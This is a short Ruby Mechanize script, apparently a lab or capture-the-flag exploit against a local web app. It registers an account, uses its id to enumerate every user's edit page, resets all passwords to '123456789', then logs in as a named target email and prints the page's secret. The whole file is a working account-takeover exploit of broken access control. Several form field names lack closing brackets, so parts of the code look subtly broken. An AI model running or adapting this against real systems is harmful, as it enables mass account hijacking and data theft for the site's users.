require 'mechanize'

TARGET  = 'peter.parker@gmail.com'
PASS    = '123456789'

Mechanize.new.instance_eval do
  
  # Register new user
  get 'http://localhost:3000/users/new'

  page.forms.first.tap do |f|
    f['user[name']   = 'me'
    f['user[email]'] = 'me@me.com'
    f.submit
  end

  # Capture new user id
  max_id = page.uri.to_s
            .match(/\/users\/(...)\/edit/)
            .captures.first.to_i

  # Complete registration
  page.forms.first.tap do |f|
    f['user[password'] = PASS
    f.submit
  end

  # Loop through all users
  (1..max_id).each do |id|
    # Visit edit users page
    get "users/#{id}/edit"

    # Change password to default
    page.forms.first.tap do |f|
      f['user[password]'] = PASS
      f.submit
    end
  end

  # Login as target
  get '/session/new'

  page.forms.first.tap do |f|
    f['session[email']     = TARGET
    f['session[password]'] = PASS
    f.submit
  end

  # Output the secret
  puts page.search('.secret').text.strip
end
